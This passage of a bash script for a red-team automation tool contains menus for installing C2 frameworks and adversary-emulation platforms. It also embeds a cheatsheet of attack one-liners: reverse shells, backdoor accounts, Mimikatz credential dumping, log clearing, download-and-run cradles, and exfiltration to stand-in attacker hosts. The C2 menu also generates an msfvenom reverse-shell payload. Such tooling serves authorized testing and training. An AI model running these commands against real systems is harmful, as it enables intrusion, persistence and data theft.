  ./linux-exploit-suggester.sh              # Linux kernel exploits
  .\Seatbelt.exe -group=all                 # Windows enumeration

═══════════════════════════════════════════════════════════════════════════════
                               PERSISTENCE
═══════════════════════════════════════════════════════════════════════════════

Linux:
  echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc
  (crontab -l; echo "*/10 * * * * /tmp/shell.sh") | crontab -
  ssh-keygen -t rsa; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

Windows:
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"
  schtasks /create /tn "Updater" /tr "C:\backdoor.exe" /sc minute /mo 10
  net user backdoor password123 /add; net localgroup administrators backdoor /add

═══════════════════════════════════════════════════════════════════════════════
                             CREDENTIAL ACCESS
═══════════════════════════════════════════════════════════════════════════════

Windows:
  sekurlsa::logonpasswords                   # Mimikatz - dump passwords
  lsadump::sam                               # Mimikatz - dump SAM
  privilege::debug; token::elevate; lsadump::secrets  # Mimikatz - dump secrets

Linux:
  cat /etc/shadow                            # Password hashes
  cat ~/.bash_history                        # Command history
  find / -name "*.key" -o -name "*.pem" 2>/dev/null  # SSH keys

Network:
  responder -I eth0 -rdwv                    # LLMNR/NBT-NS poisoning
  python3 ntlmrelayx.py -tf targets.txt -smb2support  # NTLM relay

═══════════════════════════════════════════════════════════════════════════════
                              LATERAL MOVEMENT
═══════════════════════════════════════════════════════════════════════════════

Pass-the-Hash:
  pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:hash' //target cmd
  impacket-psexec domain/user@target -hashes :hash

Remote Access:
  ssh user@target                            # SSH access
  rdesktop target:3389                       # RDP access
  impacket-wmiexec domain/user:pass@target   # WMI execution

File Transfer:
  scp file.txt user@target:/tmp/              # SCP transfer
  python3 -m http.server 8000                # Simple HTTP server
  certutil -urlcache -split -f http://attacker/file.exe file.exe  # Windows download

═══════════════════════════════════════════════════════════════════════════════
                               DEFENSE EVASION
═══════════════════════════════════════════════════════════════════════════════

Obfuscation:
  echo "command" | base64                    # Base64 encoding
  powershell -EncodedCommand $encoded       # PowerShell encoded command
  msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

Process Injection:
  Start-Process notepad; $proc = Get-Process notepad; [System.Diagnostics.Process]::EnterDebugMode()

Anti-Forensics:
  wevtutil cl Security                       # Clear Windows event logs
  history -c                                # Clear bash history
  rm ~/.bash_history                        # Delete bash history

═══════════════════════════════════════════════════════════════════════════════
                              COMMAND & CONTROL
═══════════════════════════════════════════════════════════════════════════════

PowerShell Empire:
  (New-Object System.Net.WebClient).DownloadString('http://server/empire') | IEX

Metasploit:
  use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp

Cobalt Strike:
  powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://server/a'))"

═══════════════════════════════════════════════════════════════════════════════
                                 EXFILTRATION
═══════════════════════════════════════════════════════════════════════════════

Data Staging:
  find / -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null | head -20
  tar -czf data.tar.gz /home/user/Documents/

Data Transfer:
  nc -l 4444 > data.tar.gz                  # Netcat listener
  curl -X POST -F "file=@data.tar.gz" http://attacker/upload
  scp data.tar.gz user@attacker:/tmp/

DNS Exfiltration:
  for i in $(cat data.txt); do nslookup $i.attacker.com; done

EOF
    
    read -p "Press Enter to continue..."
}

show_mitre_attack_matrix() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                           MITRE ATT&CK MATRIX                                ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

═══════════════════════════════════════════════════════════════════════════════
                              ENTERPRISE TACTICS
═══════════════════════════════════════════════════════════════════════════════

TA0043 - Reconnaissance
  T1595 - Active Scanning
  T1590 - Gather Victim Network Information
  T1589 - Gather Victim Identity Information

TA0042 - Resource Development
  T1583 - Acquire Infrastructure
  T1586 - Compromise Accounts
  T1584 - Compromise Infrastructure

TA0001 - Initial Access
  T1566 - Phishing
  T1190 - Exploit Public-Facing Application
  T1133 - External Remote Services

TA0002 - Execution
  T1059 - Command and Scripting Interpreter
  T1569 - System Services
  T1106 - Native API

TA0003 - Persistence
  T1547 - Boot or Logon Autostart Execution
  T1053 - Scheduled Task/Job
  T1136 - Create Account

TA0004 - Privilege Escalation
  T1548 - Abuse Elevation Control Mechanism
  T1055 - Process Injection
  T1068 - Exploitation for Privilege Escalation

TA0005 - Defense Evasion
  T1027 - Obfuscated Files or Information
  T1055 - Process Injection
  T1562 - Impair Defenses

TA0006 - Credential Access
  T1003 - OS Credential Dumping
  T1110 - Brute Force
  T1558 - Steal or Forge Kerberos Tickets

TA0007 - Discovery
  T1083 - File and Directory Discovery
  T1057 - Process Discovery
  T1018 - Remote System Discovery

TA0008 - Lateral Movement
  T1021 - Remote Services
  T1210 - Exploitation of Remote Services
  T1534 - Internal Spearphishing

TA0009 - Collection
  T1005 - Data from Local System
  T1113 - Screen Capture
  T1115 - Clipboard Data

TA0011 - Command and Control
  T1071 - Application Layer Protocol
  T1573 - Encrypted Channel
  T1090 - Proxy

TA0010 - Exfiltration
  T1041 - Exfiltration Over C2 Channel
  T1048 - Exfiltration Over Alternative Protocol
  T1567 - Exfiltration Over Web Service

TA0040 - Impact
  T1485 - Data Destruction
  T1486 - Data Encrypted for Impact
  T1490 - Inhibit System Recovery

EOF
    
    read -p "Press Enter to continue..."
}

# ============================================================================
#                              MENU SYSTEMS
# ============================================================================

show_caldera_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                          MITRE CALDERA OPERATIONS                           ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install/Setup Caldera${NC}"
        echo -e "2.  ${BLUE}Update Caldera${NC}"
        echo -e "3.  ${BLUE}Start Caldera Server${NC}"
        echo -e "4.  ${BLUE}Stop Caldera Server${NC}"
        echo -e "5.  ${BLUE}Install Additional Plugins${NC}"
        echo -e "6.  ${BLUE}View Caldera Logs${NC}"
        echo -e "7.  ${BLUE}Caldera Configuration${NC}"
        echo -e "8.  ${BLUE}Open Caldera Web Interface${NC}"
        echo -e "9.  ${BLUE}View Documentation${NC}"
        echo -e "10. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-10]: ${NC}"
        read caldera_choice
        
        case $caldera_choice in
            1) install_caldera; read -p "Press Enter to continue...";;
            2) update_caldera; read -p "Press Enter to continue...";;
            3) start_caldera; read -p "Press Enter to continue...";;
            4) stop_caldera; read -p "Press Enter to continue...";;
            5) install_caldera_plugins; read -p "Press Enter to continue...";;
            6) 
                if [[ -f "$CALDERA_DIR/logs/caldera.log" ]]; then
                    tail -f "$CALDERA_DIR/logs/caldera.log"
                else
                    log "WARNING" "No Caldera logs found"
                fi
                ;;
            7) 
                if [[ -f "$CALDERA_DIR/conf/local.yml" ]]; then
                    ${EDITOR:-nano} "$CALDERA_DIR/conf/local.yml"
                else
                    log "ERROR" "Configuration file not found"
                fi
                ;;
            8) 
                if command -v xdg-open &> /dev/null; then
                    xdg-open "http://localhost:8888" 2>/dev/null
                elif command -v open &> /dev/null; then
                    open "http://localhost:8888" 2>/dev/null
                fi
                log "INFO" "Opening http://localhost:8888 in browser"
                ;;
            9) 
                if command -v xdg-open &> /dev/null; then
                    xdg-open "https://caldera.readthedocs.io/" 2>/dev/null
                elif command -v open &> /dev/null; then
                    open "https://caldera.readthedocs.io/" 2>/dev/null
                fi
                ;;
            10) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 10."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_atomic_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                         ATOMIC RED TEAM OPERATIONS                          ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install/Update Atomic Red Team${NC}"
        echo -e "2.  ${BLUE}List All Techniques${NC}"
        echo -e "3.  ${BLUE}Search Techniques${NC}"
        echo -e "4.  ${BLUE}Run Specific Test${NC}"
        echo -e "5.  ${BLUE}Browse by Tactic${NC}"
        echo -e "6.  ${BLUE}Generate Test Report${NC}"
        echo -e "7.  ${BLUE}View Documentation${NC}"
        echo -e "8.  ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-8]: ${NC}"
        read atomic_choice
        
        case $atomic_choice in
            1) install_atomic_red_team; read -p "Press Enter to continue...";;
            2) list_atomic_techniques "all"; read -p "Press Enter to continue...";;
            3) 
                read -p "Enter search term: " search_term
                grep -r "$search_term" "$ATOMIC_RED_TEAM_DIR/atomics" --include="*.yaml" 2>/dev/null
                read -p "Press Enter to continue..."
                ;;
            4) 
                read -p "Enter Technique ID (e.g., T1059): " tech_id
                read -p "Enter Test GUID or leave blank to list: " test_guid
                if [[ -z "$test_guid" ]]; then
                    list_atomic_techniques "$tech_id"
                else
                    run_atomic_test "$tech_id" "$test_guid"
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                echo "Available Tactics:"
                echo "1. Execution (TA0002)"
                echo "2. Persistence (TA0003)"
                echo "3. Privilege Escalation (TA0004)"
                echo "4. Defense Evasion (TA0005)"
                echo "5. Credential Access (TA0006)"
                echo "6. Discovery (TA0007)"
                echo "7. Lateral Movement (TA0008)"
                echo "8. Collection (TA0009)"
                read -p "Select tactic number: " tactic_num
                case $tactic_num in
                    1) list_atomic_techniques "TA0002";;
                    2) list_atomic_techniques "TA0003";;
                    3) list_atomic_techniques "TA0004";;
                    4) list_atomic_techniques "TA0005";;
                    5) list_atomic_techniques "TA0006";;
                    6) list_atomic_techniques "TA0007";;
                    7) list_atomic_techniques "TA0008";;
                    8) list_atomic_techniques "TA0009";;
                esac
                read -p "Press Enter to continue..."
                ;;
            6) 
                log "INFO" "Generating Atomic Red Team test report..."
                echo "Test report functionality would be implemented here"
                read -p "Press Enter to continue..."
                ;;
            7) 
                if command -v xdg-open &> /dev/null; then
                    xdg-open "https://atomicredteam.io/" 2>/dev/null
                elif command -v open &> /dev/null; then
                    open "https://atomicredteam.io/" 2>/dev/null
                fi
                ;;
            8) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 8."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_c2_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                         COMMAND & CONTROL FRAMEWORKS                        ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install PowerShell Empire${NC}"
        echo -e "2.  ${BLUE}Install Covenant C2${NC}"
        echo -e "3.  ${BLUE}Install Sliver C2${NC}"
        echo -e "4.  ${BLUE}Install Mythic C2${NC}"
        echo -e "5.  ${BLUE}Start Empire Server${NC}"
        echo -e "6.  ${BLUE}Start Covenant Server${NC}"
        echo -e "7.  ${BLUE}Start Sliver Server${NC}"
        echo -e "8.  ${BLUE}Start Mythic Server${NC}"
        echo -e "9.  ${BLUE}Generate Payloads${NC}"
        echo -e "10. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-10]: ${NC}"
        read c2_choice
        
        case $c2_choice in
            1) install_empire; read -p "Press Enter to continue...";;
            2) install_covenant; read -p "Press Enter to continue...";;
            3) install_sliver; read -p "Press Enter to continue...";;
            4) install_mythic; read -p "Press Enter to continue...";;
            5) 
                if [[ -d "$EMPIRE_DIR" ]]; then
                    cd "$EMPIRE_DIR" && python3 empire &
                    EMPIRE_PID=$!
                    log "SUCCESS" "Empire started with PID $EMPIRE_PID"
                else
                    log "ERROR" "Empire not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            6) 
                if [[ -d "$COVENANT_DIR" ]]; then
                    cd "$COVENANT_DIR/Covenant" && dotnet run &
                    COVENANT_PID=$!
                    log "SUCCESS" "Covenant started with PID $COVENANT_PID"
                else
                    log "ERROR" "Covenant not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            7) 
                if [[ -f "$TOOLS_DIR/sliver-server" ]]; then
                    "$TOOLS_DIR/sliver-server" &
                    log "SUCCESS" "Sliver server started"
                else
                    log "ERROR" "Sliver not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            8) 
                if [[ -d "$MYTHIC_DIR" ]]; then
                    cd "$MYTHIC_DIR" && make start
                    log "SUCCESS" "Mythic server started"
                else
                    log "ERROR" "Mythic not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            9) 
                echo "Payload generation options:"
                echo "1. MSFVenom payloads"
                echo "2. Empire stagers"
                echo "3. Sliver implants"
                read -p "Select option: " payload_choice
                case $payload_choice in
                    1) 
                        read -p "Enter LHOST: " lhost
                        read -p "Enter LPORT: " lport
                        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o payload.exe
                        log "SUCCESS" "Payload generated as payload.exe"
                        ;;
                    2) log "INFO" "Empire stager generation would be implemented";;
                    3) log "INFO" "Sliver implant generation would be implemented";;
                esac
                read -p "Press Enter to continue..."
                ;;
            10) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 10."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_purple_team_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                           PURPLE TEAM OPERATIONS                            ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1. ${BLUE}Install Purple Team Tools${NC}"
        echo -e "2. ${BLUE}Install Threat Hunting Tools${NC}"
        echo -e "3. ${BLUE}Install Adversary Emulation Tools${NC}"
        echo -e "4. ${BLUE}Start VECTR Platform${NC}"
        echo -e "5. ${BLUE}Start Detection Lab${NC}"
        echo -e "6. ${BLUE}Generate Purple Team Report${NC}"
        echo -e "7. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-7]: ${NC}"
        read purple_choice
        
        case $purple_choice in
            1) install_purple_team_tools; read -p "Press Enter to continue...";;
            2) install_threat_hunting_tools; read -p "Press Enter to continue...";;
            3) install_adversary_emulation_tools; read -p "Press Enter to continue...";;
            4) 
                if [[ -d "$TOOLS_DIR/VECTR" ]]; then
                    cd "$TOOLS_DIR/VECTR" && docker-compose up -d
                    log "SUCCESS" "VECTR platform started"
                else
                    log "ERROR" "VECTR not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                if [[ -d "$TOOLS_DIR/DetectionLab" ]]; then
                    cd "$TOOLS_DIR/DetectionLab" && vagrant up
                    log "SUCCESS" "Detection Lab started"
                else
                    log "ERROR" "Detection Lab not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            6) 
                log "INFO" "Purple team report generation would be implemented"
                read -p "Press Enter to continue..."
                ;;
            7) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 7."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_tools_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                            SECURITY TOOLS MANAGEMENT                        ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install All Tools${NC}"
        echo -e "2.  ${BLUE}Update All Tools${NC}"
        echo -e "3.  ${BLUE}Tool Status Check${NC}"
        echo -e "4.  ${BLUE}Remove Tools${NC}"
        echo -e "5.  ${BLUE}Backup Configuration${NC}"
        echo -e "6.  ${BLUE}Restore Configuration${NC}"
        echo -e "7.  ${BLUE}Clean Temporary Files${NC}"
        echo -e "8.  ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-8]: ${NC}"
        read tools_choice
        
        case $tools_choice in
            1) 
                log "INFO" "Installing all security tools..."
                install_caldera
                install_atomic_red_team
                install_empire
                install_covenant
                install_sliver
                install_mythic
                install_purple_team_tools
                install_threat_hunting_tools
                install_adversary_emulation_tools
                log "SUCCESS" "All tools installation complete"
                read -p "Press Enter to continue..."
                ;;
            2) 
                log "INFO" "Updating all tools..."
                [[ -d "$CALDERA_DIR" ]] && update_caldera
                [[ -d "$ATOMIC_RED_TEAM_DIR" ]] && (cd "$ATOMIC_RED_TEAM_DIR" && git pull)
                [[ -d "$EMPIRE_DIR" ]] && (cd "$EMPIRE_DIR" && git pull)
                [[ -d "$COVENANT_DIR" ]] && (cd "$COVENANT_DIR" && git pull)
                log "SUCCESS" "All tools updated"
                read -p "Press Enter to continue..."
                ;;
            3) 
                echo -e "${GREEN}Tool Status Check:${NC}"
                echo -e "Caldera: $([[ -d "$CALDERA_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Atomic Red Team: $([[ -d "$ATOMIC_RED_TEAM_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Empire: $([[ -d "$EMPIRE_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Covenant: $([[ -d "$COVENANT_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Sliver: $([[ -f "$TOOLS_DIR/sliver-server" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                echo -e "Mythic: $([[ -d "$MYTHIC_DIR" ]] && echo "✓ Installed" || echo "✗ Not Installed")"
                read -p "Press Enter to continue..."
                ;;
            4) 
                echo -e "${RED}WARNING: This will remove all installed tools!${NC}"
                read -p "Are you sure? (type 'DELETE' to confirm): " confirm
                if [[ "$confirm" == "DELETE" ]]; then
                    rm -rf "$TOOLS_DIR"
                    log "SUCCESS" "All tools removed"
                else
                    log "INFO" "Operation cancelled"
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                backup_file="$BACKUP_DIR/config_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
                tar -czf "$backup_file" "$CONFIG_FILE" "$TOOLS_DIR"/*.conf 2>/dev/null
                log "SUCCESS" "Configuration backed up to $backup_file"
                read -p "Press Enter to continue..."
                ;;
            6) 
                echo "Available backups:"
                ls -la "$BACKUP_DIR"/*.tar.gz 2>/dev/null
                read -p "Enter backup filename to restore: " backup_name
                if [[ -f "$BACKUP_DIR/$backup_name" ]]; then
                    tar -xzf "$BACKUP_DIR/$backup_name" -C /
                    log "SUCCESS" "Configuration restored from $backup_name"
                else
                    log "ERROR" "Backup file not found"
                fi
                read -p "Press Enter to continue..."
                ;;
            7) 
                rm -rf "$TEMP_DIR"
                mkdir -p "$TEMP_DIR"
                find /tmp -name "redteam_*" -type d -exec rm -rf {} + 2>/dev/null
                log "SUCCESS" "Temporary files cleaned"
                read -p "Press Enter to continue..."
                ;;
            8) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 8."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_main_menu() {
    while true; do
        banner
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                              MAIN MENU                                      ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}MITRE Caldera Operations${NC}"
        echo -e "2.  ${BLUE}Atomic Red Team Tests${NC}"
        echo -e "3.  ${BLUE}Command & Control Frameworks${NC}"
        echo -e "4.  ${BLUE}Purple Team Operations${NC}"
        echo -e "5.  ${BLUE}Security Tools Management${NC}"
        echo -e "6.  ${BLUE}Utility Tools (DNS/Anti-Forensics)${NC}"
        echo -e "7.  ${BLUE}Comprehensive Cheatsheet${NC}"
        echo -e "8.  ${BLUE}MITRE ATT&CK Matrix${NC}"
        echo -e "9.  ${BLUE}System Information${NC}"
        echo -e "10. ${BLUE}Configuration Settings${NC}"
        echo -e "11. ${BLUE}View Logs${NC}"
        echo -e "12. ${BLUE}About & Help${NC}"
        echo -e "13. ${BLUE}Exit${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-13]: ${NC}"
        read main_choice
        
        case $main_choice in
            1) show_caldera_menu;;
            2) show_atomic_menu;;
            3) show_c2_menu;;
            4) show_purple_team_menu;;
            5) show_tools_menu;;
            6) show_utility_tools_menu;;
            7) show_comprehensive_cheatsheet;;
            8) show_mitre_attack_matrix;;
            9) show_system_info;;
            10) show_config_menu;;
            11) show_logs_menu;;
            12) show_about_help;;
            13) 
                cleanup_and_exit
                ;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 13."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_config_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                          CONFIGURATION SETTINGS                             ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1. ${BLUE}View Current Configuration${NC}"
        echo -e "2. ${BLUE}Edit Configuration File${NC}"
        echo -e "3. ${BLUE}Reset to Defaults${NC}"
        echo -e "4. ${BLUE}Toggle Debug Mode${NC}"
        echo -e "5. ${BLUE}Toggle Auto Update${NC}"
        echo -e "6. ${BLUE}Toggle Backup${NC}"
        echo -e "7. ${BLUE}Set Tools Directory${NC}"
        echo -e "8. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-8]: ${NC}"
        read config_choice
        
        case $config_choice in
            1) 
                echo -e "${GREEN}Current Configuration:${NC}"
                cat "$CONFIG_FILE"
                read -p "Press Enter to continue..."
                ;;
            2) 
                ${EDITOR:-nano} "$CONFIG_FILE"
                source "$CONFIG_FILE"
                log "SUCCESS" "Configuration reloaded"
                ;;
            3) 
                read -p "Reset configuration to defaults? (y/n): " reset_choice
                if [[ "$reset_choice" =~ [yY] ]]; then
                    rm "$CONFIG_FILE"
                    init_config
                    log "SUCCESS" "Configuration reset to defaults"
                fi
                ;;
            4) 
                if [[ "$DEBUG_MODE" == "true" ]]; then
                    sed -i 's/DEBUG_MODE="true"/DEBUG_MODE="false"/' "$CONFIG_FILE"
                    log "INFO" "Debug mode disabled"
                else
                    sed -i 's/DEBUG_MODE="false"/DEBUG_MODE="true"/' "$CONFIG_FILE"
                    log "INFO" "Debug mode enabled"
                fi
                source "$CONFIG_FILE"
                ;;
            5) 
                if [[ "$AUTO_UPDATE" == "true" ]]; then
                    sed -i 's/AUTO_UPDATE="true"/AUTO_UPDATE="false"/' "$CONFIG_FILE"
                    log "INFO" "Auto update disabled"
                else
                    sed -i 's/AUTO_UPDATE="false"/AUTO_UPDATE="true"/' "$CONFIG_FILE"
                    log "INFO" "Auto update enabled"
                fi
                source "$CONFIG_FILE"
                ;;
            6) 
                if [[ "$BACKUP_ENABLED" == "true" ]]; then
                    sed -i 's/BACKUP_ENABLED="true"/BACKUP_ENABLED="false"/' "$CONFIG_FILE"
                    log "INFO" "Backup disabled"
                else
                    sed -i 's/BACKUP_ENABLED="false"/BACKUP_ENABLED="true"/' "$CONFIG_FILE"
                    log "INFO" "Backup enabled"
                fi
                source "$CONFIG_FILE"
                ;;
            7) 
                read -p "Enter new tools directory path: " new_path
                if [[ -n "$new_path" ]]; then
                    sed -i "s|TOOLS_DIR=.*|TOOLS_DIR=\"$new_path\"|" "$CONFIG_FILE"
                    source "$CONFIG_FILE"
                    mkdir -p "$TOOLS_DIR"
                    log "SUCCESS" "Tools directory updated to $new_path"
                fi
                ;;
            8) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 8."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_logs_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                                                             LOG VIEWER                                    ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1. ${BLUE}View Script Logs${NC}"
        echo -e "2. ${BLUE}View Caldera Logs${NC}"
        echo -e "3. ${BLUE}View System Logs${NC}"
        echo -e "4. ${BLUE}Clear All Logs${NC}"
        echo -e "5. ${BLUE}Export Logs${NC}"
        echo -e "6. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-6]: ${NC}"
        read logs_choice
        
        case $logs_choice in
            1) 
                if [[ -f "$LOG_FILE" ]]; then
                    tail -n 50 "$LOG_FILE"
                    echo -e "${BLUE}--- End of logs ---${NC}"
                else
                    log "WARNING" "No script logs found"
                fi
                read -p "Press Enter to continue..."
                ;;
            2) 
                if [[ -f "$CALDERA_DIR/logs/caldera.log" ]]; then
                    tail -n 50 "$CALDERA_DIR/logs/caldera.log"
                else
                    log "WARNING" "No Caldera logs found"
                fi
                read -p "Press Enter to continue..."
                ;;
            3) 
                echo "Recent system events:"
                journalctl --since "1 hour ago" --no-pager | tail -20
                read -p "Press Enter to continue..."
                ;;
            4) 
                read -p "Clear all logs? (y/n): " clear_choice
                if [[ "$clear_choice" =~ [yY] ]]; then
                    > "$LOG_FILE"
                    [[ -f "$CALDERA_DIR/logs/caldera.log" ]] && > "$CALDERA_DIR/logs/caldera.log"
                    log "SUCCESS" "All logs cleared"
                fi
                ;;
            5) 
                export_file="$BACKUP_DIR/logs_export_$(date +%Y%m%d_%H%M%S).tar.gz"
                tar -czf "$export_file" "$LOG_FILE" "$CALDERA_DIR/logs"/* 2>/dev/null
                log "SUCCESS" "Logs exported to $export_file"
                read -p "Press Enter to continue..."
                ;;
            6) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 6."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_about_help() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                           ABOUT & HELP                                      ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

═══════════════════════════════════════════════════════════════════════════════
                         ULTIMATE RED TEAM AUTOMATION v3.0
═══════════════════════════════════════════════════════════════════════════════

DESCRIPTION:
This comprehensive security framework provides automated installation, 
configuration, and management of various red team, blue team, and purple team 
security tools aligned with the MITRE ATT&CK framework.

FEATURES:
• MITRE Caldera adversary emulation platform
• Atomic Red Team automated testing
• Multiple C2 frameworks (Empire, Covenant, Sliver, Mythic)
• Purple team collaboration tools
• Threat hunting and detection tools
• Comprehensive security cheatsheets
• MITRE ATT&CK matrix integration
• Automated tool management and updates

SUPPORTED TOOLS:
• MITRE Caldera - Automated adversary emulation
• Atomic Red Team - Portable detection tests
• PowerShell Empire - Post-exploitation framework
• Covenant - .NET C2 framework
• Sliver - Cross-platform C2 framework
• Mythic - Collaborative post-exploitation framework
• VECTR - Purple team tracking platform
• Detection Lab - Threat detection laboratory
• HELK - Threat hunting ELK stack
• Sigma Rules - Generic detection rules

SYSTEM REQUIREMENTS:
• Linux/macOS/Windows with WSL
• Python 3.6+
• Docker (for some tools)
• Git
• Minimum 8GB RAM recommended
• 50GB+ free disk space

USAGE GUIDELINES:
• For authorized security testing only
• Ensure proper permissions before use
• Follow responsible disclosure practices
• Keep tools updated regularly
• Maintain operational security

SUPPORT:
• Documentation: Built-in help system
• Configuration: Automated setup and management
• Logging: Comprehensive activity tracking
• Backup: Automatic configuration backups

DISCLAIMER:
This tool is intended for educational and authorized security testing purposes 
only. Users are responsible for ensuring compliance with applicable laws and 
regulations. Unauthorized use is strictly prohibited.

VERSION: 3.0
AUTHOR: Enhanced Security Framework
LICENSE: Educational Use Only

═══════════════════════════════════════════════════════════════════════════════

QUICK START GUIDE:
1. Run the script with appropriate permissions
2. Install desired tools from the Tools Management menu
3. Configure settings as needed
4. Start with Atomic Red Team for basic testing
5. Progress to advanced frameworks like Caldera
6. Use Purple Team tools for collaborative security exercises

TROUBLESHOOTING:
• Check system dependencies if installation fails
• Review logs for detailed error information
• Ensure sufficient disk space and permissions
• Verify network connectivity for downloads
• Consult documentation for specific tool issues

EOF
    
    read -p "Press Enter to continue..."
}

cleanup_and_exit() {
    log "INFO" "Shutting down Ultimate Red Team Automation..."
    
    # Stop running processes
    [[ -n "$CALDERA_PID" ]] && kill "$CALDERA_PID" 2>/dev/null
    [[ -n "$EMPIRE_PID" ]] && kill "$EMPIRE_PID" 2>/dev/null
    [[ -n "$COVENANT_PID" ]] && kill "$COVENANT_PID" 2>/dev/null
    
    # Clean up temporary files
    rm -rf "$TEMP_DIR"
    
    # Final backup if enabled
    if [[ "$BACKUP_ENABLED" == "true" ]]; then
        backup_file="$BACKUP_DIR/final_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
